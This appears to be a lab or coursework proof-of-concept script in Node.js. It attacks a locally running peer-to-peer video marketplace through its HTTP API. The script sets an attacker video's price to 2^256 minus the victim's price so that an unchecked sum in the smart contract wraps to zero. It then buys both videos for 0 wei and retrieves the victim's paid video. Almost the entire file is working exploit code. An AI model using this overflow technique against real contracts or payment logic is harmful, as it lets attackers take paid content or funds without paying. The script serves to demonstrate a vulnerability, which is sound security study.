// Integer-overflow attack - THROUGH THE API (attacks the whole application).
//
// Unlike the direct attack, this one only talks to the HTTP server. It registers
// two users, has the victim upload a normal paid video, has the attacker upload a
// video with a crafted huge wei price, then calls the vulnerable batch endpoint
// PUT /purchaseVideos with value = 0. The contract's unchecked sum overflows to 0,
// the payment check passes, and the attacker gains access to the victim's video.
//
// REQUIRES THE FULL STACK RUNNING:
//   1. PostgreSQL with the peerplay DB + schema (P2P App/app/schema.sql)
//   2. npx hardhat node          (in P2P App/contract)
//   3. deploy the contract       (npx hardhat run scripts/deploy.js --network localhost)
//   4. fill P2P App/app/config.js (COTRACT_ADDRESS + WALLET_PRIVATE_KEYS)
//   5. the server                (npm start in P2P App/app)  ->  http://localhost:3001
//
// Run:  node attacks/overflow-api.js      (from P2P App/app, Node 18+ for global fetch)

const BASE = "http://localhost:3001";
const TWO_256 = 2n ** 256n;
const stamp = Date.now(); // makes uploaded bytes (and thus CIDs) unique per run

const b64 = (s) => Buffer.from(s).toString("base64");

async function req(method, path, body, token) {
  const res = await fetch(BASE + path, {
    method,
    headers: {
      "Content-Type": "application/json",
      ...(token ? { Authorization: "Bearer " + token } : {}),
    },
    body: body === undefined ? undefined : JSON.stringify(body),
  });
  return res;
}

async function register(username, password) {
  // Ignore 409 (user already exists from a previous run).
  await req("POST", "/register", { username, password });
}

async function login(username, password) {
  const res = await req("POST", "/login", { username, password });
  const data = await res.json();
  if (!data.token) throw new Error(`login failed for ${username}: ${JSON.stringify(data)}`);
  return data.token;
}

async function main() {
  console.log("=== Integer overflow - attack through the API ===\n");

  const victimPrice = 10n ** 17n;            // 0.1 ETH in wei
  const evilPrice = TWO_256 - victimPrice;   // so victimPrice + evilPrice == 2^256 (== 0)

  // 1. Register + login both users.
  await register("victim", "victim123");
  await register("attacker", "attacker123");
  const victimToken = await login("victim", "victim123");
  const attackerToken = await login("attacker", "attacker123");
  console.log("Registered + logged in: victim, attacker");

  // Unique filenames per run so repeated runs don't create duplicate (owner, filename)
  // rows (which would make the lookup return >1 row and fail with 404).
  const victimName = "victimVideo_" + stamp;
  const evilName = "evilVideo_" + stamp;

  // 2. Victim uploads a normal paid video (server default price 0.1 ETH).
  const up1 = await req("POST", "/upload",
    { file: b64("victim-video-" + stamp), filename: victimName }, victimToken);
  console.log("Victim upload status:", up1.status);

  // 3. Attacker uploads a video with a crafted huge wei price.
  const up2 = await req("POST", "/upload",
    { file: b64("evil-video-" + stamp), filename: evilName, price: evilPrice.toString() },
    attackerToken);
  console.log("Attacker upload status:", up2.status, "(price = 2^256 - victimPrice wei)");

  // 4. Attacker batch-buys BOTH videos for 0 wei.
  console.log("\nAttacker calls PUT /purchaseVideos with value = 0 ...");
  const buy = await req("PUT", "/purchaseVideos", {
    items: [
      { owner: "victim", videoName: victimName },
      { owner: "attacker", videoName: evilName },
    ],
    value: "0",
  }, attackerToken);
  console.log("purchaseVideos status:", buy.status);
  console.log(await buy.text());

  // 5. Attacker retrieves the victim's paid video -> proves stolen access.
  const ret = await req("POST", "/retrieve", { owner: "victim", videoName: victimName }, attackerToken);
  console.log("\nRetrieve victim's video status:", ret.status,
    ret.status === 200 ? " <-- ACCESS GRANTED (stolen for free)" : " <-- access denied");
}

main().catch((e) => { console.error(e); process.exitCode = 1; });
